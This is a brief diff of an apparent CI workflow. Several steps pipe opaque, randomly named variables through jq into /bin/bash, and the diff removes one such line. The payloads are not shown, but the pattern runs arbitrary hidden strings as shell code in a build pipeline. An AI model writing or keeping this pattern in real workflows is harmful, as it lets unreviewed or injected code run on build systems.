@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$ido40704" | jq -r .pb65515 | /bin/bash
           echo $dbbzc81 | jq -r .e1831 | /bin/bash
           printf '%s' "$ry2" | jq -r .pdibv359 | /bin/bash
-          echo $x8873 | jq -r .tez742 | /bin/bash
           printf '%s' "$fyr53" | jq -r .op03 | /bin/bash
 
       - name: Save archive
